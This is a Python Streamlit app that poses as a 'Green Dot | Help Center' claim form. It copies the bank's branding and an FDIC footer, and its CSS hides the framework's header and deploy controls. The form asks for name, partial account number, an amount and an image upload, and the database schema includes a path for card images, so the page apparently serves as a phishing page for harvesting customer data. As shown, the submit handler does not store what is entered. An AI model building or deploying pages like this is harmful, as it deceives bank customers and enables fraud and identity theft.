
import streamlit as st
import sqlite3
import os
import pandas as pd
from datetime import datetime

# VERSIÓN 1.0.1 - PRODUCCIÓN CON LOGO CENTRADO
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# CSS Consolidado con Logo Centrado
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 2rem !important; }
    header, footer, .stDeployButton, [data-testid='stHeader'] { display: none !important; }
    
    /* LOGO CENTRADO EN PC Y MÓVIL */
    [data-testid="stImage"] {
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        margin-left: auto !important;
        margin-right: auto !important;
        width: 100% !important;
        text-align: center !important;
    }
    
    [data-testid="stImage"] img {
        width: 250px !important; 
        margin: 0 auto !important;
    }

    @media (max-width: 768px) {
        [data-testid="stImage"] img { width: 180px !important; }
    }

    .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }
    .legal-container { font-size: 11px; color: #777; text-align: center; margin-top: 50px; border-top: 1px solid #222; padding-top: 20px; }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): 
    st.image("logo.svg")

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("claim_v1", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Amount", min_value=0.0)
    st.file_uploader("Evidence", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("<div class='legal-container'>Green Dot Bank, Member FDIC. ©2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
